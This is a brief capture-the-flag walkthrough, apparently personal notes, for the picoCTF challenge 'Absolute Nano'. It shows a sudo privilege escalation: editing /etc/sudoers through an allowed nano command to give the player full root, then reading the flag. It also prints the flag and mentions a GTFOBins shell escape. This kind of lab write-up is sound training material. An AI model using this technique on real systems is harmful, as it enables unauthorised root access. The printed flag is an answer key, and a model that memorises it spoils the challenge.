# ABSOLUTE NANO PROBLEM GUIDE:

*(General Skills — Medium, 200pt)*

## HINTS:
Hint 1: Title = `nano`. What can you run with sudo?

## TOOLS:
`$ sudo -l`

`$ sudo /bin/nano /etc/sudoers`

## WALKTHROUGH:
1. `$ sudo -l`
    - `(ALL) NOPASSWD: /bin/nano /etc/sudoers`
    - You can edit the sudoers file itself as root

2. `$ sudo /bin/nano /etc/sudoers`
    - Change your own line from the restricted entry to full root:
        - before: `ctf-player ALL=(ALL) NOPASSWD: /bin/nano /etc/sudoers`
        - after:  `ctf-player ALL=(ALL:ALL) ALL`
    - Save and exit

3. `$ sudo cat flag.txt`
    - Answer: `picoCTF{n4n0_411_7h3_w4y_6a5c67f2}`

## NOTES:
- Being able to `sudo`-edit `/etc/sudoers` is game over — grant yourself blanket rights, then run anything as root.
- Same family as [[sudo-make-me-a-sandwich]] (nano can also drop a shell directly with `^R^X` per GTFOBins, but editing sudoers is cleaner here).
